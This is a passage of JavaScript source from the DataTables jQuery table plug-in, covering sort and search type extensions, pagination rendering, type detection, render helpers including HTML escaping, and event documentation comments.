			 * data to be search on. For example, it can be used to strip HTML

			 * tags or to de-format telephone numbers for numeric only searching.

			 *

			 * Note that is a search is not defined for a column of a given type,

			 * no search formatting will be performed.

			 * 

			 * Pre-processing of searching data plug-ins - When you assign the sType

			 * for a column (or have it automatically detected for you by DataTables

			 * or a type detection plug-in), you will typically be using this for

			 * custom sorting, but it can also be used to provide custom searching

			 * by allowing you to pre-processing the data and returning the data in

			 * the format that should be searched upon. This is done by adding

			 * functions this object with a parameter name which matches the sType

			 * for that target column. This is the corollary of <i>afnSortData</i>

			 * for searching data.

			 *

			 * The functions defined take a single parameter:

			 *

		     *  1. `{*}` Data from the column cell to be prepared for searching

			 *

			 * Each function is expected to return:

			 *

			 * * `{string|null}` Formatted string that will be used for the searching.

			 *

			 *  @type object

			 *  @default {}

			 *

			 *  @example

			 *    $.fn.dataTable.ext.type.search['title-numeric'] = function ( d ) {

			 *      return d.replace(/\n/g," ").replace( /<.*?>/g, "" );

			 *    }

			 */

			search: {},

	

	

			/**

			 * Type based ordering.

			 *

			 * The column type tells DataTables what ordering to apply to the table

			 * when a column is sorted upon. The order for each type that is defined,

			 * is defined by the functions available in this object.

			 *

			 * Each ordering option can be described by three properties added to

			 * this object:

			 *

			 * * `{type}-pre` - Pre-formatting function

			 * * `{type}-asc` - Ascending order function

			 * * `{type}-desc` - Descending order function

			 *

			 * All three can be used together, only `{type}-pre` or only

			 * `{type}-asc` and `{type}-desc` together. It is generally recommended

			 * that only `{type}-pre` is used, as this provides the optimal

			 * implementation in terms of speed, although the others are provided

			 * for compatibility with existing Javascript sort functions.

			 *

			 * `{type}-pre`: Functions defined take a single parameter:

			 *

		     *  1. `{*}` Data from the column cell to be prepared for ordering

			 *

			 * And return:

			 *

			 * * `{*}` Data to be sorted upon

			 *

			 * `{type}-asc` and `{type}-desc`: Functions are typical Javascript sort

			 * functions, taking two parameters:

			 *

		     *  1. `{*}` Data to compare to the second parameter

		     *  2. `{*}` Data to compare to the first parameter

			 *

			 * And returning:

			 *

			 * * `{*}` Ordering match: <0 if first parameter should be sorted lower

			 *   than the second parameter, ===0 if the two parameters are equal and

			 *   >0 if the first parameter should be sorted height than the second

			 *   parameter.

			 * 

			 *  @type object

			 *  @default {}

			 *

			 *  @example

			 *    // Numeric ordering of formatted numbers with a pre-formatter

			 *    $.extend( $.fn.dataTable.ext.type.order, {

			 *      "string-pre": function(x) {

			 *        a = (a === "-" || a === "") ? 0 : a.replace( /[^\d\-\.]/g, "" );

			 *        return parseFloat( a );

			 *      }

			 *    } );

			 *

			 *  @example

			 *    // Case-sensitive string ordering, with no pre-formatting method

			 *    $.extend( $.fn.dataTable.ext.order, {

			 *      "string-case-asc": function(x,y) {

			 *        return ((x < y) ? -1 : ((x > y) ? 1 : 0));

			 *      },

			 *      "string-case-desc": function(x,y) {

			 *        return ((x < y) ? 1 : ((x > y) ? -1 : 0));

			 *      }

			 *    } );

			 */

			order: {}

		},

	

		/**

		 * Unique DataTables instance counter

		 *

		 * @type int

		 * @private

		 */

		_unique: 0,

	

	

		//

		// Depreciated

		// The following properties are retained for backwards compatiblity only.

		// The should not be used in new projects and will be removed in a future

		// version

		//

	

		/**

		 * Version check function.

		 *  @type function

		 *  @depreciated Since 1.10

		 */

		fnVersionCheck: DataTable.fnVersionCheck,

	

	

		/**

		 * Index for what 'this' index API functions should use

		 *  @type int

		 *  @deprecated Since v1.10

		 */

		iApiIndex: 0,

	

	

		/**

		 * jQuery UI class container

		 *  @type object

		 *  @deprecated Since v1.10

		 */

		oJUIClasses: {},

	

	

		/**

		 * Software version

		 *  @type string

		 *  @deprecated Since v1.10

		 */

		sVersion: DataTable.version

	};

	

	

	//

	// Backwards compatibility. Alias to pre 1.10 Hungarian notation counter parts

	//

	$.extend( _ext, {

		afnFiltering: _ext.search,

		aTypes:       _ext.type.detect,

		ofnSearch:    _ext.type.search,

		oSort:        _ext.type.order,

		afnSortData:  _ext.order,

		aoFeatures:   _ext.feature,

		oApi:         _ext.internal,

		oStdClasses:  _ext.classes,

		oPagination:  _ext.pager

	} );

	

	

	$.extend( DataTable.ext.classes, {

		"sTable": "dataTable",

		"sNoFooter": "no-footer",

	

		/* Paging buttons */

		"sPageButton": "paginate_button",

		"sPageButtonActive": "current",

		"sPageButtonDisabled": "disabled",

	

		/* Striping classes */

		"sStripeOdd": "odd",

		"sStripeEven": "even",

	

		/* Empty row */

		"sRowEmpty": "dataTables_empty",

	

		/* Features */

		"sWrapper": "dataTables_wrapper",

		"sFilter": "dataTables_filter",

		"sInfo": "dataTables_info",

		"sPaging": "dataTables_paginate paging_", /* Note that the type is postfixed */

		"sLength": "dataTables_length",

		"sProcessing": "dataTables_processing",

	

		/* Sorting */

		"sSortAsc": "sorting_asc",

		"sSortDesc": "sorting_desc",

		"sSortable": "sorting", /* Sortable in both directions */

		"sSortableAsc": "sorting_asc_disabled",

		"sSortableDesc": "sorting_desc_disabled",

		"sSortableNone": "sorting_disabled",

		"sSortColumn": "sorting_", /* Note that an int is postfixed for the sorting order */

	

		/* Filtering */

		"sFilterInput": "",

	

		/* Page length */

		"sLengthSelect": "",

	

		/* Scrolling */

		"sScrollWrapper": "dataTables_scroll",

		"sScrollHead": "dataTables_scrollHead",

		"sScrollHeadInner": "dataTables_scrollHeadInner",

		"sScrollBody": "dataTables_scrollBody",

		"sScrollFoot": "dataTables_scrollFoot",

		"sScrollFootInner": "dataTables_scrollFootInner",

	

		/* Misc */

		"sHeaderTH": "",

		"sFooterTH": "",

	

		// Deprecated

		"sSortJUIAsc": "",

		"sSortJUIDesc": "",

		"sSortJUI": "",

		"sSortJUIAscAllowed": "",

		"sSortJUIDescAllowed": "",

		"sSortJUIWrapper": "",

		"sSortIcon": "",

		"sJUIHeader": "",

		"sJUIFooter": ""

	} );

	

	

	var extPagination = DataTable.ext.pager;

	

	function _numbers ( page, pages ) {

		var

			numbers = [],

			buttons = extPagination.numbers_length,

			half = Math.floor( buttons / 2 ),

			i = 1;

	

		if ( pages <= buttons ) {

			numbers = _range( 0, pages );

		}

		else if ( page <= half ) {

			numbers = _range( 0, buttons-2 );

			numbers.push( 'ellipsis' );

			numbers.push( pages-1 );

		}

		else if ( page >= pages - 1 - half ) {

			numbers = _range( pages-(buttons-2), pages );

			numbers.splice( 0, 0, 'ellipsis' ); // no unshift in ie6

			numbers.splice( 0, 0, 0 );

		}

		else {

			numbers = _range( page-half+2, page+half-1 );

			numbers.push( 'ellipsis' );

			numbers.push( pages-1 );

			numbers.splice( 0, 0, 'ellipsis' );

			numbers.splice( 0, 0, 0 );

		}

	

		numbers.DT_el = 'span';

		return numbers;

	}

	

	

	$.extend( extPagination, {

		simple: function ( page, pages ) {

			return [ 'previous', 'next' ];

		},

	

		full: function ( page, pages ) {

			return [  'first', 'previous', 'next', 'last' ];

		},

	

		numbers: function ( page, pages ) {

			return [ _numbers(page, pages) ];

		},

	

		simple_numbers: function ( page, pages ) {

			return [ 'previous', _numbers(page, pages), 'next' ];

		},

	

		full_numbers: function ( page, pages ) {

			return [ 'first', 'previous', _numbers(page, pages), 'next', 'last' ];

		},

		

		first_last_numbers: function (page, pages) {

	 		return ['first', _numbers(page, pages), 'last'];

	 	},

	

		// For testing and plug-ins to use

		_numbers: _numbers,

	

		// Number of number buttons (including ellipsis) to show. _Must be odd!_

		numbers_length: 7

	} );

	

	

	$.extend( true, DataTable.ext.renderer, {

		pageButton: {

			_: function ( settings, host, idx, buttons, page, pages ) {

				var classes = settings.oClasses;

				var lang = settings.oLanguage.oPaginate;

				var aria = settings.oLanguage.oAria.paginate || {};

				var btnDisplay, btnClass, counter=0;

	

				var attach = function( container, buttons ) {

					var i, ien, node, button, tabIndex;

					var disabledClass = classes.sPageButtonDisabled;

					var clickHandler = function ( e ) {

						_fnPageChange( settings, e.data.action, true );

					};

	

					for ( i=0, ien=buttons.length ; i<ien ; i++ ) {

						button = buttons[i];

	

						if ( $.isArray( button ) ) {

							var inner = $( '<'+(button.DT_el || 'div')+'/>' )

								.appendTo( container );

							attach( inner, button );

						}

						else {

							btnDisplay = null;

							btnClass = button;

							tabIndex = settings.iTabIndex;

	

							switch ( button ) {

								case 'ellipsis':

									container.append('<span class="ellipsis">&#x2026;</span>');

									break;

	

								case 'first':

									btnDisplay = lang.sFirst;

	

									if ( page === 0 ) {

										tabIndex = -1;

										btnClass += ' ' + disabledClass;

									}

									break;

	

								case 'previous':

									btnDisplay = lang.sPrevious;

	

									if ( page === 0 ) {

										tabIndex = -1;

										btnClass += ' ' + disabledClass;

									}

									break;

	

								case 'next':

									btnDisplay = lang.sNext;

	

									if ( pages === 0 || page === pages-1 ) {

										tabIndex = -1;

										btnClass += ' ' + disabledClass;

									}

									break;

	

								case 'last':

									btnDisplay = lang.sLast;

	

									if ( page === pages-1 ) {

										tabIndex = -1;

										btnClass += ' ' + disabledClass;

									}

									break;

	

								default:

									btnDisplay = button + 1;

									btnClass = page === button ?

										classes.sPageButtonActive : '';

									break;

							}

	

							if ( btnDisplay !== null ) {

								node = $('<a>', {

										'class': classes.sPageButton+' '+btnClass,

										'aria-controls': settings.sTableId,

										'aria-label': aria[ button ],

										'data-dt-idx': counter,

										'tabindex': tabIndex,

										'id': idx === 0 && typeof button === 'string' ?

											settings.sTableId +'_'+ button :

											null

									} )

									.html( btnDisplay )

									.appendTo( container );

	

								_fnBindAction(

									node, {action: button}, clickHandler

								);

	

								counter++;

							}

						}

					}

				};

	

				// IE9 throws an 'unknown error' if document.activeElement is used

				// inside an iframe or frame. Try / catch the error. Not good for

				// accessibility, but neither are frames.

				var activeEl;

	

				try {

					// Because this approach is destroying and recreating the paging

					// elements, focus is lost on the select button which is bad for

					// accessibility. So we want to restore focus once the draw has

					// completed

					activeEl = $(host).find(document.activeElement).data('dt-idx');

				}

				catch (e) {}

	

				attach( $(host).empty(), buttons );

	

				if ( activeEl !== undefined ) {

					$(host).find( '[data-dt-idx='+activeEl+']' ).trigger('focus');

				}

			}

		}

	} );

	

	

	

	// Built in type detection. See model.ext.aTypes for information about

	// what is required from this methods.

	$.extend( DataTable.ext.type.detect, [

		// Plain numbers - first since V8 detects some plain numbers as dates

		// e.g. Date.parse('55') (but not all, e.g. Date.parse('22')...).

		function ( d, settings )

		{

			var decimal = settings.oLanguage.sDecimal;

			return _isNumber( d, decimal ) ? 'num'+decimal : null;

		},

	

		// Dates (only those recognised by the browser's Date.parse)

		function ( d, settings )

		{

			// V8 tries _very_ hard to make a string passed into `Date.parse()`

			// valid, so we need to use a regex to restrict date formats. Use a

			// plug-in for anything other than ISO8601 style strings

			if ( d && !(d instanceof Date) && ! _re_date.test(d) ) {

				return null;

			}

			var parsed = Date.parse(d);

			return (parsed !== null && !isNaN(parsed)) || _empty(d) ? 'date' : null;

		},

	

		// Formatted numbers

		function ( d, settings )

		{

			var decimal = settings.oLanguage.sDecimal;

			return _isNumber( d, decimal, true ) ? 'num-fmt'+decimal : null;

		},

	

		// HTML numeric

		function ( d, settings )

		{

			var decimal = settings.oLanguage.sDecimal;

			return _htmlNumeric( d, decimal ) ? 'html-num'+decimal : null;

		},

	

		// HTML numeric, formatted

		function ( d, settings )

		{

			var decimal = settings.oLanguage.sDecimal;

			return _htmlNumeric( d, decimal, true ) ? 'html-num-fmt'+decimal : null;

		},

	

		// HTML (this is strict checking - there must be html)

		function ( d, settings )

		{

			return _empty( d ) || (typeof d === 'string' && d.indexOf('<') !== -1) ?

				'html' : null;

		}

	] );

	

	

	

	// Filter formatting functions. See model.ext.ofnSearch for information about

	// what is required from these methods.

	// 

	// Note that additional search methods are added for the html numbers and

	// html formatted numbers by `_addNumericSort()` when we know what the decimal

	// place is

	

	

	$.extend( DataTable.ext.type.search, {

		html: function ( data ) {

			return _empty(data) ?

				data :

				typeof data === 'string' ?

					data

						.replace( _re_new_lines, " " )

						.replace( _re_html, "" ) :

					'';

		},

	

		string: function ( data ) {

			return _empty(data) ?

				data :

				typeof data === 'string' ?

					data.replace( _re_new_lines, " " ) :

					data;

		}

	} );

	

	

	

	var __numericReplace = function ( d, decimalPlace, re1, re2 ) {

		if ( d !== 0 && (!d || d === '-') ) {

			return -Infinity;

		}

	

		// If a decimal place other than `.` is used, it needs to be given to the

		// function so we can detect it and replace with a `.` which is the only

		// decimal place Javascript recognises - it is not locale aware.

		if ( decimalPlace ) {

			d = _numToDecimal( d, decimalPlace );

		}

	

		if ( d.replace ) {

			if ( re1 ) {

				d = d.replace( re1, '' );

			}

	

			if ( re2 ) {

				d = d.replace( re2, '' );

			}

		}

	

		return d * 1;

	};

	

	

	// Add the numeric 'deformatting' functions for sorting and search. This is done

	// in a function to provide an easy ability for the language options to add

	// additional methods if a non-period decimal place is used.

	function _addNumericSort ( decimalPlace ) {

		$.each(

			{

				// Plain numbers

				"num": function ( d ) {

					return __numericReplace( d, decimalPlace );

				},

	

				// Formatted numbers

				"num-fmt": function ( d ) {

					return __numericReplace( d, decimalPlace, _re_formatted_numeric );

				},

	

				// HTML numeric

				"html-num": function ( d ) {

					return __numericReplace( d, decimalPlace, _re_html );

				},

	

				// HTML numeric, formatted

				"html-num-fmt": function ( d ) {

					return __numericReplace( d, decimalPlace, _re_html, _re_formatted_numeric );

				}

			},

			function ( key, fn ) {

				// Add the ordering method

				_ext.type.order[ key+decimalPlace+'-pre' ] = fn;

	

				// For HTML types add a search formatter that will strip the HTML

				if ( key.match(/^html\-/) ) {

					_ext.type.search[ key+decimalPlace ] = _ext.type.search.html;

				}

			}

		);

	}

	

	

	// Default sort methods

	$.extend( _ext.type.order, {

		// Dates

		"date-pre": function ( d ) {

			var ts = Date.parse( d );

			return isNaN(ts) ? -Infinity : ts;

		},

	

		// html

		"html-pre": function ( a ) {

			return _empty(a) ?

				'' :

				a.replace ?

					a.replace( /<.*?>/g, "" ).toLowerCase() :

					a+'';

		},

	

		// string

		"string-pre": function ( a ) {

			// This is a little complex, but faster than always calling toString,

			// http://jsperf.com/tostring-v-check

			return _empty(a) ?

				'' :

				typeof a === 'string' ?

					a.toLowerCase() :

					! a.toString ?

						'' :

						a.toString();

		},

	

		// string-asc and -desc are retained only for compatibility with the old

		// sort methods

		"string-asc": function ( x, y ) {

			return ((x < y) ? -1 : ((x > y) ? 1 : 0));

		},

	

		"string-desc": function ( x, y ) {

			return ((x < y) ? 1 : ((x > y) ? -1 : 0));

		}

	} );

	

	

	// Numeric sorting types - order doesn't matter here

	_addNumericSort( '' );

	

	

	$.extend( true, DataTable.ext.renderer, {

		header: {

			_: function ( settings, cell, column, classes ) {

				// No additional mark-up required

				// Attach a sort listener to update on sort - note that using the

				// `DT` namespace will allow the event to be removed automatically

				// on destroy, while the `dt` namespaced event is the one we are

				// listening for

				$(settings.nTable).on( 'order.dt.DT', function ( e, ctx, sorting, columns ) {

					if ( settings !== ctx ) { // need to check this this is the host

						return;               // table, not a nested one

					}

	

					var colIdx = column.idx;

	

					cell

						.removeClass(

							column.sSortingClass +' '+

							classes.sSortAsc +' '+

							classes.sSortDesc

						)

						.addClass( columns[ colIdx ] == 'asc' ?

							classes.sSortAsc : columns[ colIdx ] == 'desc' ?

								classes.sSortDesc :

								column.sSortingClass

						);

				} );

			},

	

			jqueryui: function ( settings, cell, column, classes ) {

				$('<div/>')

					.addClass( classes.sSortJUIWrapper )

					.append( cell.contents() )

					.append( $('<span/>')

						.addClass( classes.sSortIcon+' '+column.sSortingClassJUI )

					)

					.appendTo( cell );

	

				// Attach a sort listener to update on sort

				$(settings.nTable).on( 'order.dt.DT', function ( e, ctx, sorting, columns ) {

					if ( settings !== ctx ) {

						return;

					}

	

					var colIdx = column.idx;

	

					cell

						.removeClass( classes.sSortAsc +" "+classes.sSortDesc )

						.addClass( columns[ colIdx ] == 'asc' ?

							classes.sSortAsc : columns[ colIdx ] == 'desc' ?

								classes.sSortDesc :

								column.sSortingClass

						);

	

					cell

						.find( 'span.'+classes.sSortIcon )

						.removeClass(

							classes.sSortJUIAsc +" "+

							classes.sSortJUIDesc +" "+

							classes.sSortJUI +" "+

							classes.sSortJUIAscAllowed +" "+

							classes.sSortJUIDescAllowed

						)

						.addClass( columns[ colIdx ] == 'asc' ?

							classes.sSortJUIAsc : columns[ colIdx ] == 'desc' ?

								classes.sSortJUIDesc :

								column.sSortingClassJUI

						);

				} );

			}

		}

	} );

	

	/*

	 * Public helper functions. These aren't used internally by DataTables, or

	 * called by any of the options passed into DataTables, but they can be used

	 * externally by developers working with DataTables. They are helper functions

	 * to make working with DataTables a little bit easier.

	 */

	

	var __htmlEscapeEntities = function ( d ) {

		return typeof d === 'string' ?

			d

				.replace(/&/g, '&amp;')

				.replace(/</g, '&lt;')

				.replace(/>/g, '&gt;')

				.replace(/"/g, '&quot;') :

			d;

	};

	

	/**

	 * Helpers for `columns.render`.

	 *

	 * The options defined here can be used with the `columns.render` initialisation

	 * option to provide a display renderer. The following functions are defined:

	 *

	 * * `number` - Will format numeric data (defined by `columns.data`) for

	 *   display, retaining the original unformatted data for sorting and filtering.

	 *   It takes 5 parameters:

	 *   * `string` - Thousands grouping separator

	 *   * `string` - Decimal point indicator

	 *   * `integer` - Number of decimal points to show

	 *   * `string` (optional) - Prefix.

	 *   * `string` (optional) - Postfix (/suffix).

	 * * `text` - Escape HTML to help prevent XSS attacks. It has no optional

	 *   parameters.

	 *

	 * @example

	 *   // Column definition using the number renderer

	 *   {

	 *     data: "salary",

	 *     render: $.fn.dataTable.render.number( '\'', '.', 0, '$' )

	 *   }

	 *

	 * @namespace

	 */

	DataTable.render = {

		number: function ( thousands, decimal, precision, prefix, postfix ) {

			return {

				display: function ( d ) {

					if ( typeof d !== 'number' && typeof d !== 'string' ) {

						return d;

					}

	

					var negative = d < 0 ? '-' : '';

					var flo = parseFloat( d );

	

					// If NaN then there isn't much formatting that we can do - just

					// return immediately, escaping any HTML (this was supposed to

					// be a number after all)

					if ( isNaN( flo ) ) {

						return __htmlEscapeEntities( d );

					}

	

					flo = flo.toFixed( precision );

					d = Math.abs( flo );

	

					var intPart = parseInt( d, 10 );

					var floatPart = precision ?

						decimal+(d - intPart).toFixed( precision ).substring( 2 ):

						'';

	

					return negative + (prefix||'') +

						intPart.toString().replace(

							/\B(?=(\d{3})+(?!\d))/g, thousands

						) +

						floatPart +

						(postfix||'');

				}

			};

		},

	

		text: function () {

			return {

				display: __htmlEscapeEntities,

				filter: __htmlEscapeEntities

			};

		}

	};

	

	

	/*

	 * This is really a good bit rubbish this method of exposing the internal methods

	 * publicly... - To be fixed in 2.0 using methods on the prototype

	 */

	

	

	/**

	 * Create a wrapper function for exporting an internal functions to an external API.

	 *  @param {string} fn API function name

	 *  @returns {function} wrapped function

	 *  @memberof DataTable#internal

	 */

	function _fnExternApiFunc (fn)

	{

		return function() {

			var args = [_fnSettingsFromNode( this[DataTable.ext.iApiIndex] )].concat(

				Array.prototype.slice.call(arguments)

			);

			return DataTable.ext.internal[fn].apply( this, args );

		};

	}

	

	

	/**

	 * Reference to internal functions for use by plug-in developers. Note that

	 * these methods are references to internal functions and are considered to be

	 * private. If you use these methods, be aware that they are liable to change

	 * between versions.

	 *  @namespace

	 */

	$.extend( DataTable.ext.internal, {

		_fnExternApiFunc: _fnExternApiFunc,

		_fnBuildAjax: _fnBuildAjax,

		_fnAjaxUpdate: _fnAjaxUpdate,

		_fnAjaxParameters: _fnAjaxParameters,

		_fnAjaxUpdateDraw: _fnAjaxUpdateDraw,

		_fnAjaxDataSrc: _fnAjaxDataSrc,

		_fnAddColumn: _fnAddColumn,

		_fnColumnOptions: _fnColumnOptions,

		_fnAdjustColumnSizing: _fnAdjustColumnSizing,

		_fnVisibleToColumnIndex: _fnVisibleToColumnIndex,

		_fnColumnIndexToVisible: _fnColumnIndexToVisible,

		_fnVisbleColumns: _fnVisbleColumns,

		_fnGetColumns: _fnGetColumns,

		_fnColumnTypes: _fnColumnTypes,

		_fnApplyColumnDefs: _fnApplyColumnDefs,

		_fnHungarianMap: _fnHungarianMap,

		_fnCamelToHungarian: _fnCamelToHungarian,

		_fnLanguageCompat: _fnLanguageCompat,

		_fnBrowserDetect: _fnBrowserDetect,

		_fnAddData: _fnAddData,

		_fnAddTr: _fnAddTr,

		_fnNodeToDataIndex: _fnNodeToDataIndex,

		_fnNodeToColumnIndex: _fnNodeToColumnIndex,

		_fnGetCellData: _fnGetCellData,

		_fnSetCellData: _fnSetCellData,

		_fnSplitObjNotation: _fnSplitObjNotation,

		_fnGetObjectDataFn: _fnGetObjectDataFn,

		_fnSetObjectDataFn: _fnSetObjectDataFn,

		_fnGetDataMaster: _fnGetDataMaster,

		_fnClearTable: _fnClearTable,

		_fnDeleteIndex: _fnDeleteIndex,

		_fnInvalidate: _fnInvalidate,

		_fnGetRowElements: _fnGetRowElements,

		_fnCreateTr: _fnCreateTr,

		_fnBuildHead: _fnBuildHead,

		_fnDrawHead: _fnDrawHead,

		_fnDraw: _fnDraw,

		_fnReDraw: _fnReDraw,

		_fnAddOptionsHtml: _fnAddOptionsHtml,

		_fnDetectHeader: _fnDetectHeader,

		_fnGetUniqueThs: _fnGetUniqueThs,

		_fnFeatureHtmlFilter: _fnFeatureHtmlFilter,

		_fnFilterComplete: _fnFilterComplete,

		_fnFilterCustom: _fnFilterCustom,

		_fnFilterColumn: _fnFilterColumn,

		_fnFilter: _fnFilter,

		_fnFilterCreateSearch: _fnFilterCreateSearch,

		_fnEscapeRegex: _fnEscapeRegex,

		_fnFilterData: _fnFilterData,

		_fnFeatureHtmlInfo: _fnFeatureHtmlInfo,

		_fnUpdateInfo: _fnUpdateInfo,

		_fnInfoMacros: _fnInfoMacros,

		_fnInitialise: _fnInitialise,

		_fnInitComplete: _fnInitComplete,

		_fnLengthChange: _fnLengthChange,

		_fnFeatureHtmlLength: _fnFeatureHtmlLength,

		_fnFeatureHtmlPaginate: _fnFeatureHtmlPaginate,

		_fnPageChange: _fnPageChange,

		_fnFeatureHtmlProcessing: _fnFeatureHtmlProcessing,

		_fnProcessingDisplay: _fnProcessingDisplay,

		_fnFeatureHtmlTable: _fnFeatureHtmlTable,

		_fnScrollDraw: _fnScrollDraw,

		_fnApplyToChildren: _fnApplyToChildren,

		_fnCalculateColumnWidths: _fnCalculateColumnWidths,

		_fnThrottle: _fnThrottle,

		_fnConvertToWidth: _fnConvertToWidth,

		_fnGetWidestNode: _fnGetWidestNode,

		_fnGetMaxLenString: _fnGetMaxLenString,

		_fnStringToCss: _fnStringToCss,

		_fnSortFlatten: _fnSortFlatten,

		_fnSort: _fnSort,

		_fnSortAria: _fnSortAria,

		_fnSortListener: _fnSortListener,

		_fnSortAttachListener: _fnSortAttachListener,

		_fnSortingClasses: _fnSortingClasses,

		_fnSortData: _fnSortData,

		_fnSaveState: _fnSaveState,

		_fnLoadState: _fnLoadState,

		_fnSettingsFromNode: _fnSettingsFromNode,

		_fnLog: _fnLog,

		_fnMap: _fnMap,

		_fnBindAction: _fnBindAction,

		_fnCallbackReg: _fnCallbackReg,

		_fnCallbackFire: _fnCallbackFire,

		_fnLengthOverflow: _fnLengthOverflow,

		_fnRenderer: _fnRenderer,

		_fnDataSource: _fnDataSource,

		_fnRowAttributes: _fnRowAttributes,

		_fnExtend: _fnExtend,

		_fnCalculateEnd: function () {} // Used by a lot of plug-ins, but redundant

		                                // in 1.10, so this dead-end function is

		                                // added to prevent errors

	} );

	



	// jQuery access

	$.fn.dataTable = DataTable;



	// Provide access to the host jQuery object (circular reference)

	DataTable.$ = $;



	// Legacy aliases

	$.fn.dataTableSettings = DataTable.settings;

	$.fn.dataTableExt = DataTable.ext;



	// With a capital `D` we return a DataTables API instance rather than a

	// jQuery object

	$.fn.DataTable = function ( opts ) {

		return $(this).dataTable( opts ).api();

	};



	// All properties that are available to $.fn.dataTable should also be

	// available on $.fn.DataTable

	$.each( DataTable, function ( prop, val ) {

		$.fn.DataTable[ prop ] = val;

	} );





	// Information about events fired by DataTables - for documentation.

	/**

	 * Draw event, fired whenever the table is redrawn on the page, at the same

	 * point as fnDrawCallback. This may be useful for binding events or

	 * performing calculations when the table is altered at all.

	 *  @name DataTable#draw.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 */



	/**

	 * Search event, fired when the searching applied to the table (using the

	 * built-in global search, or column filters) is altered.

	 *  @name DataTable#search.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 */



	/**

	 * Page change event, fired when the paging of the table is altered.

	 *  @name DataTable#page.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 */



	/**

	 * Order event, fired when the ordering applied to the table is altered.

	 *  @name DataTable#order.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 */



	/**

	 * DataTables initialisation complete event, fired when the table is fully

	 * drawn, including Ajax data loaded, if Ajax data is required.

	 *  @name DataTable#init.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} oSettings DataTables settings object

	 *  @param {object} json The JSON object request from the server - only

	 *    present if client-side Ajax sourced data is used</li></ol>

	 */



	/**

	 * State save event, fired when the table has changed state a new state save

	 * is required. This event allows modification of the state saving object

	 * prior to actually doing the save, including addition or other state

	 * properties (for plug-ins) or modification of a DataTables core property.

	 *  @name DataTable#stateSaveParams.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} oSettings DataTables settings object

	 *  @param {object} json The state information to be saved

	 */



	/**

	 * State load event, fired when the table is loading state from the stored

	 * data, but prior to the settings object being modified by the saved state

	 * - allowing modification of the saved state is required or loading of

	 * state for a plug-in.

	 *  @name DataTable#stateLoadParams.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} oSettings DataTables settings object

	 *  @param {object} json The saved state information

	 */



	/**

	 * State loaded event, fired when state has been loaded from stored data and

	 * the settings object has been modified by the loaded data.

	 *  @name DataTable#stateLoaded.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} oSettings DataTables settings object

	 *  @param {object} json The saved state information

	 */



	/**

	 * Processing event, fired when DataTables is doing some kind of processing

	 * (be it, order, search or anything else). It can be used to indicate to

	 * the end user that there is something happening, or that something has

	 * finished.

	 *  @name DataTable#processing.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} oSettings DataTables settings object

	 *  @param {boolean} bShow Flag for if DataTables is doing processing or not

	 */



	/**

	 * Ajax (XHR) event, fired whenever an Ajax request is completed from a

	 * request to made to the server for new data. This event is called before

	 * DataTables processed the returned data, so it can also be used to pre-

	 * process the data returned from the server, if needed.

	 *

	 * Note that this trigger is called in `fnServerData`, if you override

	 * `fnServerData` and which to use this event, you need to trigger it in you

	 * success function.

	 *  @name DataTable#xhr.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 *  @param {object} json JSON returned from the server

	 *

	 *  @example

	 *     // Use a custom property returned from the server in another DOM element

	 *     $('#table').dataTable().on('xhr.dt', function (e, settings, json) {

	 *       $('#status').html( json.status );

	 *     } );

	 *

	 *  @example

	 *     // Pre-process the data returned from the server

	 *     $('#table').dataTable().on('xhr.dt', function (e, settings, json) {

	 *       for ( var i=0, ien=json.aaData.length ; i<ien ; i++ ) {

	 *         json.aaData[i].sum = json.aaData[i].one + json.aaData[i].two;

	 *       }

	 *       // Note no return - manipulate the data directly in the JSON object.

	 *     } );

	 */



	/**

	 * Destroy event, fired when the DataTable is destroyed by calling fnDestroy

	 * or passing the bDestroy:true parameter in the initialisation object. This

	 * can be used to remove bound events, added DOM nodes, etc.

	 *  @name DataTable#destroy.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 */



	/**

	 * Page length change event, fired when number of records to show on each

	 * page (the length) is changed.

	 *  @name DataTable#length.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 *  @param {integer} len New length

	 */



	/**

	 * Column sizing has changed.

	 *  @name DataTable#column-sizing.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 */



	/**

	 * Column visibility has changed.

	 *  @name DataTable#column-visibility.dt

	 *  @event

	 *  @param {event} e jQuery event object

	 *  @param {object} o DataTables settings object {@link DataTable.models.oSettings}

	 *  @param {int} column Column index

	 *  @param {bool} vis `false` if column now hidden, or `true` if visible

	 */



	return $.fn.dataTable;

}));





